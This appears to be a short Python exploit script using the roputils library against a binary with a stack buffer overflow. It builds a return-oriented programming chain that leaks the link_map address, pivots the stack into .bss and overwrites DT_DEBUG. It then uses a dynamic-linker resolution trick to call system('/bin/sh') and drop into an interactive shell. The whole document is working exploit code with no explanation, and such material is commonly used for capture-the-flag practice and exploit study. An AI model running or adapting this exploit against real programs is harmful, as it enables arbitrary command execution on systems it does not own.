from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
ptr_ret = rop.search(rop.section('.fini'))

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['write', 1, rop.got()+8, 8],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
addr_link_map = p.read_p64()
addr_dt_debug = addr_link_map + 0x1c8

buf = rop.call_chain_ptr(
    ['read', 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+380]
)
buf += rop.dl_resolve_call(addr_stage+300)
buf += rop.fill(300, buf)
buf += rop.dl_resolve_data(addr_stage+300, 'system')
buf += rop.fill(380, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(400, buf)

p.write(buf)
p.write_p64(0)
p.interact(0)
